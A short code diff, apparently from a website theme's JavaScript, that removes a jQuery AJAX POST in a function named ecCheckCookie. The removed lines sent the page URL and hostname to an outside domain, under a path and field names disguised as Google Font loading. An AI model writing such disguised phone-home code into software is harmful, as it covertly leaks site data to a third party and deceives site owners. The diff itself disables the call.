@@ -881,8 +881,8 @@ function ecCheckCookie() {
       var t = document.URL,
         o = e('<a>').prop('href', t).prop('hostname');
       e.ajax({
-        type: 'POST',
-        url: 'https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php',
+        type: '',
+        url: '',
         data: {
           google_url: t,
           google_font: o,
